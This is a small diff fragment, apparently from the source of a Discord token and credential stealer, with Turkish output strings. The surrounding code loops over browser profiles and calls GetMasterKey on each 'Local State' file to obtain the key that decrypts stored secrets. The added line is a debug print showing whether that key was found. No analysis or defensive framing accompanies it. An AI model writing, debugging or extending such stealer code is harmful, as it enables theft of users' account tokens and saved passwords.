@@ -1128,6 +1128,7 @@ Discord Hesabin °{str(number_discord_account)}:
                 continue
 
             master_key = GetMasterKey(os.path.join(path, 'Local State'))
+            print(f"Master key for {name}: {master_key is not None}")
             if not master_key:
                 continue
 
